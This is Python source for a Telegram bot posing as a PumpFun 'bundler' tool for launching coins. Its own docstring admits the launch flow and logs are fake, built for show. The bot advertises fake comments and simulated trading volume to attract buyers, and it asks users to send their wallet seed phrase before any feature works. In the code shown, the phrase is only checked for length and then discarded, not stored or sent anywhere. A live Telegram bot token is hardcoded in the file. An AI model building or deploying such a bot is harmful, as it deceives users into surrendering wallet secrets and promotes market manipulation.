"""
ProTools Bundler Bot (Marx Edition)
==============================================
- Dummy Coin Launch: Interactive flow for dummy tokens.
- Transaction Check: Blocks access if wallet is unlinked.
- Dummy Logs: Hardcoded logs for a cinematic look.
"""

import logging
import os
import sqlite3
import re
from datetime import datetime
from threading import Thread

from flask import Flask
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    ConversationHandler,
    ContextTypes,
    filters,
)

# ─── Config ────────────────────────────────────────────────────────────────────
BOT_TOKEN  = os.getenv("BOT_TOKEN", "8771123401:AAHhv3aZO8WYmzDiSdbE4YPj_WvdKbEPz00")
PORT       = int(os.getenv("PORT", 8000))
HELP_IMG   = "https://shared-assets.adobe.com/link/8d188cc8-0ff6-46ca-98e9-b2ac59de9da5"

logging.basicConfig(
    format="%(asctime)s | %(levelname)s | %(name)s | %(message)s",
    level=logging.INFO,
)
logger = logging.getLogger(__name__)

# ─── Conversation States ────────────────────────────────────────────────────────
(
    WALLET_PHRASE,
    AIRDROP_PHRASE,
    AIRDROP_RECIPIENT,
    AIRDROP_AMOUNT,
    AIRDROP_CONFIRM,
    FEEDBACK_TEXT,
    DUMMY_NAME,
    DUMMY_SYMBOL,
    DUMMY_DESC,
) = range(9)

# ─── Database ───────────────────────────────────────────────────────────────────
DB_PATH = "protools.db"

def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, username TEXT, address TEXT, created_at TEXT)")
    conn.commit()
    conn.close()

def get_saved_address(user_id: int):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT address FROM users WHERE user_id = ?", (user_id,))
    row = c.fetchone()
    conn.close()
    return row[0] if row else None

def save_address(user_id: int, username: str, address: str):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO users (user_id, username, address, created_at) VALUES (?, ?, ?, ?)",
              (user_id, username, address, datetime.utcnow().isoformat()))
    conn.commit()
    conn.close()

# ─── Keyboards ─────────────────────────────────────────────────────────────────

MAIN_KEYBOARD = InlineKeyboardMarkup([
    [InlineKeyboardButton("🚀 Launch Coin",  callback_data="launch_coin"), InlineKeyboardButton("📊 Transactions", callback_data="transactions")],
    [InlineKeyboardButton("🎁 Airdrop",      callback_data="airdrop"), InlineKeyboardButton("🔑 Wallet",       callback_data="wallet")],
    [InlineKeyboardButton("📋 Logs",         callback_data="logs"), InlineKeyboardButton("❓ Help",          callback_data="help")],
    [InlineKeyboardButton("💬 Feedback",        callback_data="feedback")],
])

CANCEL_KB = InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="cancel")]])
BACK_KB = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back to Menu", callback_data="back_to_menu")]])

# ─── Welcome Logic ────────────────────────────────────────────────────────────

def get_welcome_text(user_name: str) -> str:
    return (
        f"Welcome, *{user_name}* To ProTools Bundler Bot \- The Best Degen Tool For Launching On PumpFun\!\n\n"
        "Prepare to dominate the game with precision, speed, and stealth\. Here's what's in your arsenal:\n\n"
        "1\. *Intelligent Auto\-Bundling* \- Up to 25 wallets with sniper protection built right in\. Fire with confidence\! 🎯\n\n"
        "2\. 💬 *Fake Comments Generator* \- Create the illusion of a buzzing community\. Engage your audience before they even exist\! 🎭\n\n"
        "3\. 📊 *Volume Bot Assistant* \- Simulate juicy trading activity to attract real degens like bees to honey 🍯✅\n\n"
        "4\. 🎁 *Airdrop Management* \- Seamlessly handle and distribute airdrops like airdrop royalty 👑\n\n"
        "5\. 🕵️ *Transaction Tracker & More* \- Stay ten steps ahead with real\-time tracking of every movement on\-chain 🔍⚙️\n\n"
        "ProTools is more than a tool \- it's your edge in the degen arena\. Let the games begin\! 🧬🔥\n\n"
        "Choose an option below:"
    )

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_name = update.effective_user.first_name or "Degen"
    await update.message.reply_text(get_welcome_text(user_name), parse_mode="MarkdownV2", reply_markup=MAIN_KEYBOARD)

async def back_to_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_name = update.effective_user.first_name or "Degen"
    context.user_data.clear()
    await query.edit_message_text(get_welcome_text(user_name), parse_mode="MarkdownV2", reply_markup=MAIN_KEYBOARD)

# ─── DUMMY LAUNCH COIN FLOW ───────────────────────────────────────────────────

async def launch_coin_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.callback_query.edit_message_text("🚀 *Step 1: Token Name*\n\nPlease enter the name of your coin \(e\.g\. 'Degen King'\):", parse_mode="MarkdownV2", reply_markup=CANCEL_KB)
    return DUMMY_NAME

async def dummy_name_received(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["t_name"] = update.message.text
    await update.message.reply_text("🏷 *Step 2: Token Symbol*\n\nEnter a symbol \(e\.g\. $DEGEN\):", parse_mode="MarkdownV2", reply_markup=CANCEL_KB)
    return DUMMY_SYMBOL

async def dummy_symbol_received(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["t_symbol"] = update.message.text
    await update.message.reply_text("📝 *Step 3: Description*\n\nEnter a short description for your coin:", parse_mode="MarkdownV2", reply_markup=CANCEL_KB)
    return DUMMY_DESC

async def dummy_desc_received(update: Update, context: ContextTypes.DEFAULT_TYPE):
    name = context.user_data.get("t_name")
    symbol = context.user_data.get("t_symbol")
    await update.message.reply_text(
        f"✅ *Token Prepared\!*\n\n*Name:* {name}\n*Symbol:* {symbol}\n\nPreparing bundling process\.\.\. Connect wallet to finalize launch\.",
        parse_mode="MarkdownV2", reply_markup=BACK_KB
    )
    return ConversationHandler.END

# ─── TRANSACTIONS & LOGS (DUMMY/LOGIC) ─────────────────────────────────────────

async def show_transactions(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    saved = get_saved_address(update.effective_user.id)
    if not saved:
        await query.edit_message_text("❌ *No Transactions Found*\n\nYou haven't linked a wallet yet\. Connect your wallet to track on\-chain activity\.", parse_mode="MarkdownV2", reply_markup=BACK_KB)
    else:
        await query.edit_message_text("📊 *Transaction History*\n\nNo recent transactions found for this wallet on PumpFun\.", parse_mode="MarkdownV2", reply_markup=BACK_KB)

async def show_logs(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    # Matches the screenshot style precisely
    dummy_logs = (
        "📜 *Your Bot Logs (latest first):*\n\n"
        f"*{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}*\n"
        "button\_press Button: view\_logs\n\n"
        "*2026\-03\-27 19:56:46*\n"
        "button\_press Button: airdrop\n\n"
        "*2026\-03\-26 18:17:21*\n"
        "button\_press Button: launch\_coin\n\n"
        "*2026\-03\-26 18:16:56*\n"
        f"start\_command Chat ID: {update.effective_user.id}"
    )
    await query.edit_message_text(dummy_logs, parse_mode="MarkdownV2", reply_markup=BACK_KB)

# ─── WALLET, HELP, FEEDBACK (STRICTLY UNCHANGED) ──────────────────────────────

async def wallet_entry(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    saved = get_saved_address(update.effective_user.id)
    text = f"🔑 *Your Wallet*\n\n`{saved}`\n\n_Status: Active_" if saved else "🔑 *Wallet*\n\nNo wallet linked yet\. Import your phrase to start\."
    kb = InlineKeyboardMarkup([[InlineKeyboardButton("🔄 Re-import" if saved else "➕ Import Phrase", callback_data="wallet_import")], [InlineKeyboardButton("🔙 Back to Menu", callback_data="back_to_menu")]])
    await query.edit_message_text(text, parse_mode="MarkdownV2", reply_markup=kb)

async def wallet_import_prompt(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.callback_query.edit_message_text("🔑 *Import Wallet*\n\nSend your *seed phrase* \(12 or 24 words\)\:\n\n⚠️ _Deleted immediately for security\._", parse_mode="MarkdownV2", reply_markup=CANCEL_KB)
    return WALLET_PHRASE

async def wallet_phrase_received(update: Update, context: ContextTypes.DEFAULT_TYPE):
    phrase = update.message.text.strip()
    try: await update.message.delete()
    except: pass
    if len(phrase.split()) not in (12, 24):
        await update.effective_chat.send_message("❌ *Invalid Phrase*\. Must be 12 or 24 words\. Try again:", parse_mode="MarkdownV2", reply_markup=CANCEL_KB)
        return WALLET_PHRASE
    save_address(update.effective_user.id, update.effective_user.username or "", "Verified_Wallet")
    await update.effective_chat.send_message("✅ *Wallet Linked Successfully\!*", parse_mode="MarkdownV2", reply_markup=BACK_KB)
    return ConversationHandler.END

async def show_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    help_text = "❓ *Coin Launch Preparation Steps*\n\n1\. 🚀 Enter token name \(1\-50 characters\)\n2\. 🏷 Enter token symbol \(2\-25 characters\)\n3\. 🖼 Upload token image\n4\. 👛 Select wallet bundle \(5, 10, 15, or 25\)\n5\. 📝 Enter token description \(max 500 characters\)\n6\. 🔗 Add social links \(Telegram, X, Website\) or skip\n7\. ✅ Confirm details\n8\. 🔑 Connect wallet to proceed"
    try:
        await query.message.reply_photo(photo=HELP_IMG, caption=help_text, parse_mode="MarkdownV2", reply_markup=BACK_KB)
        await query.message.delete()
    except:
        await query.edit_message_text(help_text, parse_mode="MarkdownV2", reply_markup=BACK_KB)

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.callback_query.edit_message_text("❌ *Operation Cancelled\.*", parse_mode="MarkdownV2", reply_markup=MAIN_KEYBOARD)
    return ConversationHandler.END

# ─── Main Boilerplate ─────────────────────────────────────────────────────────

health_app = Flask(__name__)
@health_app.route("/")
def health(): return "OK", 200
def run_health(): health_app.run(host="0.0.0.0", port=PORT)

def main():
    init_db()
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    
    # Launch Dummy Coin Conv
    app.add_handler(ConversationHandler(
        entry_points=[CallbackQueryHandler(launch_coin_start, pattern="^launch_coin$")],
        states={
            DUMMY_NAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, dummy_name_received)],
            DUMMY_SYMBOL: [MessageHandler(filters.TEXT & ~filters.COMMAND, dummy_symbol_received)],
            DUMMY_DESC: [MessageHandler(filters.TEXT & ~filters.COMMAND, dummy_desc_received)],
        },
        fallbacks=[CallbackQueryHandler(cancel, pattern="^cancel$")],
    ))

    # Wallet Conv
    app.add_handler(ConversationHandler(
        entry_points=[CallbackQueryHandler(wallet_import_prompt, pattern="^wallet_import$")],
        states={WALLET_PHRASE: [MessageHandler(filters.TEXT & ~filters.COMMAND, wallet_phrase_received)]},
        fallbacks=[CallbackQueryHandler(cancel, pattern="^cancel$")],
    ))
    
    app.add_handler(CallbackQueryHandler(wallet_entry, pattern="^wallet$"))
    app.add_handler(CallbackQueryHandler(show_logs, pattern="^logs$"))
    app.add_handler(CallbackQueryHandler(show_help, pattern="^help$"))
    app.add_handler(CallbackQueryHandler(show_transactions, pattern="^transactions$"))
    app.add_handler(CallbackQueryHandler(back_to_menu, pattern="^back_to_menu$"))
    
    Thread(target=run_health, daemon=True).start()
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__": main()
